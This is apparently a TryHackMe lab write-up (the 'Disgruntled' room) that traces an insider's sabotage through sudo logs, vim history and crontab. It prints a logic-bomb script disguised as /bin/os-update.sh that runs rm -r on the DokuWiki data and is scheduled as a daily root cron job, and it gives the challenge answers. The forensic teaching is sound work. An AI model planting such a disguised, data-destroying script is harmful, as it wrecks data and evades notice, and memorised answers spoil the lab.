---
title: Disgruntled
tags:
  - thm
  - premium
---
# [Disgruntled](https://tryhackme.com/r/room/disgruntled)


![enter image description here](https://tryhackme-images.s3.amazonaws.com/room-icons/03de138b8dfa8f5b003298c17b73fbd8.png)
## Nothing suspicious... So far
```bash
root@ip-10-10-177-249:/var/log# cat /var/log/auth.log | grep -i sudo | grep -i COMMAND
Dec 22 07:56:27 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/date -s last year
Dec 22 07:56:36 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/nano /etc/ssh/sshd_config
Dec 22 07:57:45 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart ssh
Dec 22 07:58:09 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd -m cybert -s /bin/bash
Dec 22 07:58:14 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/passwd cybert
Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
Dec 28 06:18:12 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/rm /var/lib/dpkg/lock
Dec 28 06:18:17 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Dec 28 06:18:33 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/lsof /var/lib/dpkg/lock
Dec 28 06:18:36 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/lsof /var/lib/dpkg/lock-frontend
Dec 28 06:18:47 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/rm /var/lib/dpkg/lock-frontend
Dec 28 06:18:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
Dec 28 06:20:46 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /usr/share/dokuwiki
Dec 28 06:20:55 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /usr/share/dokuwiki/VERSION /usr/share/dokuwiki/bin /usr/share/dokuwiki/doku.php /usr/share/dokuwiki/feed.php /usr/share/dokuwiki/inc /usr/share/dokuwiki/index.php /usr/share/dokuwiki/install.php /usr/share/dokuwiki/lib /usr/share/dokuwiki/vendor -R
Dec 28 06:21:05 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /var/lib/dokuwiki
Dec 28 06:21:14 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /var/lib/dokuwiki/acl /var/lib/dokuwiki/data /var/lib/dokuwiki/inc /var/lib/dokuwiki/lib -R
Dec 28 06:21:20 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/ln -s /var/lib/dokuwiki/data /usr/share/dokuwiki/data
Dec 28 06:21:28 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/ln -s /etc/dokuwiki/license.php /usr/share/dokuwiki/conf/license.php
Dec 28 06:22:12 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/dokuwiki.conf
Dec 28 06:22:25 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/a2ensite dokuwiki
Dec 28 06:22:37 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/systemctl reload apache2
Dec 28 06:26:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/adduser it-admin
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/usr/bin/vi bomb.sh
Dec 28 06:30:10 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/bin/nano /etc/crontab
Dec 28 07:01:22 ip-10-10-117-219 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/passwd root
Dec 28 07:01:30 ip-10-10-117-219 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/passwd root
Dec 28 07:14:07 ip-10-10-243-54 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/nano /etc/ssh/sshd_config
Dec 28 07:14:27 ip-10-10-243-54 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/service sshd restart`cybert` user has executed `sudo apt install dokuwiki` on `Dec 28 06:19:01` and the command logged as `/usr/bin/apt install dokuwiki` in `/home/cybert` directory.
```
### The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
A: `/usr/bin/apt install dokuwiki`
### What was the present working directory (PWD) when the previous command was run?
A: `/home/cybert`
## Let’s see if you did anything bad
### Which user was created after the package from the previous task was installed?
```bash
root@ip-10-10-177-249:/var/log# cat /var/log/auth.log | grep adduser
Dec 28 06:26:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/adduser it-admin
```
`cybert` user has executed `adduser` command to create a user name `it-admin`.
### A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
```bash
root@ip-10-10-177-249:/var/log# cat /var/log/auth.log | grep -i COMMAND | tail -n 8 | head -n 2
Dec 28 06:26:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/adduser it-admin
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
```
`cybert` user executes  `visudo` command to configure `/etc/sudoers/` file, and give `sudo` permissions to `it-admin` user.
### A script file was opened using the "vi" text editor. What is the name of this file?
```bash
root@ip-10-10-177-249:/var/log# cat /var/log/auth.log | grep -i COMMAND | tail -n 8 | head -n 3
Dec 28 06:26:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/adduser it-admin
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/usr/bin/vi bomb.sh
```
 `it-admim` user executed `vi bomb.sh` command in  `/home/it-admin` to edit `/home/it-admin/bomb.sh` file.
 ## Bomb has been planted. But when and where?
 ### What is the command used that created the file `bomb.sh`?
 ```bash
 root@ip-10-10-177-249:~# cat /home/it-admin/.viminfo | head -n 17|tail -n 4
:q!
|2,0,1672208992,,"q!"
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"
 ```
 `it-admin` user saves a file executing `:saveas /bin/os-update.sh` instead of using  `:wq!` or `^zZ`. 
 
 Taking the previous entries into account, the user `it-admin` edited the file `/home/it-admin/bomb.sh` using the `vi` editor and saved it as `/bin/os-update.sh` using the command `:saveas /bin/os-update.sh`.
### When was the file from the previous question last modified? (Format: Month Day HH:MM)
```bash
root@ip-10-10-177-249:~# stat /bin/os-update.sh 
  File: /bin/os-update.sh
  Size: 325       	Blocks: 8          IO Block: 4096   regular file
Device: 10302h/66306d	Inode: 26          Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-08-02 09:45:14.760005052 +0000
Modify: 2022-12-28 06:29:43.998004273 +0000
Change: 2022-12-28 06:29:43.998004273 +0000
 Birth: -
```
A: `Dec 28 06:29`
### What is the name of the file that will get created when the file from the first question executes?

```bash
root@ip-10-10-177-249:~# cat /bin/os-update.sh 
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi
```
A: `goodbye.txt`
## Following the fuse
### At what time will the malicious file trigger? (Format: HH:MM AM/PM)
```bash
root@ip-10-10-177-249:~# cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
0 8	* * *	root	/bin/os-update.sh
#
```
A `cronjob` comprised by attacker assigned to `root` user that executes `/bin/os-update.sh` everyday at `08:00 AM`.  You can use [Crontab.guru](https://crontab.guru/) to convert it.